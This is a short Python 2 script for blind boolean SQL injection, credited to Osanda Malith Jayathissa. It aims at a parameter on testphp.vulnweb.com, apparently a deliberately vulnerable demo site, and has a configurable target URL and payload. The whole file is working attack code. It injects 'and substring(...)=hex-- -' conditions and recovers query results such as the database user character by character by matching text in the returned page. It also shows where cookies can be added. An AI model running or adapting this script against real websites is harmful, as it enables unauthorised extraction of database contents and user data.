import urllib2
import re

# CC-BY: Osanda Malith Jayathissa (@OsandaMalith)
# https://creativecommons.org/licenses/by/2.0/

url = 'http://testphp.vulnweb.com/artists.php?artist=2' # target
payload = '(select user())'; # your payload
trueString = 'Blad3' # Text or html in the true condition
maxLength = 20

for i in range(1, maxLength + 1):
    for j in range(32, 127):
        if(chr(j).isupper()):
            continue
        sql = " and substring("+ payload +"," + str(i) + ",1)=" + hex(ord(chr(j))) + "-- -"
        target = url + sql
        req = urllib2.Request(target)
        # If cookies exists
        # req.add_header('Cookie','value=1;value=2')
        page = urllib2.urlopen(req)
        html = page.read()

        try:
            re.search(r'(.*)'+trueString+'(.*?) .*', html, flags=re.DOTALL).group(1)
            print chr(j),
        except:
            pass
